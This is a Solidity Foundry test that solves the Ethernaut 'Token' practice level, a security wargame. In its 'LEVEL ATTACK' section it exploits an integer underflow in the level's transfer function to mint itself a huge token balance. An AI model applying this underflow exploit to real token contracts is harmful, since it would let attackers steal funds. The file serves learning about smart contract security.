pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Token/TokenFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract TokenTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));
        vm.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Change accounts from the level was set up with, have to call the transfer function from a different account
        vm.startPrank(address(1));

        // Transfer maximum amount of tokens without causing an overflow 
        ethernautToken.transfer(eoaAddress, (2**256 - 21));

        // Switch back to original account
        vm.stopPrank();
        vm.startPrank(eoaAddress);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}